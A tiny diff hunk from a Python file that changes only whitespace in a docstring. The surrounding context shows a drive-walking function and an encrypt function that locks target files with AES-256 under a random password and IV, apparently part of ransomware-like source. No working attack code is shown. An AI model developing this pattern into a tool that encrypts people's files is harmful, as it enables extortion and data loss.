@@ -25,7 +25,7 @@ def walk(drive, extensions):
     Description: Encrypt file using AES 256bit, CBC mode with random password + random IV
 
     param: (list) Target files to encrypt 
-    return: (list) Encrypted filenames 
+    return: (list)  Encrypted filenames 
 """
 def encrypt(files):
     encrypted_files = []
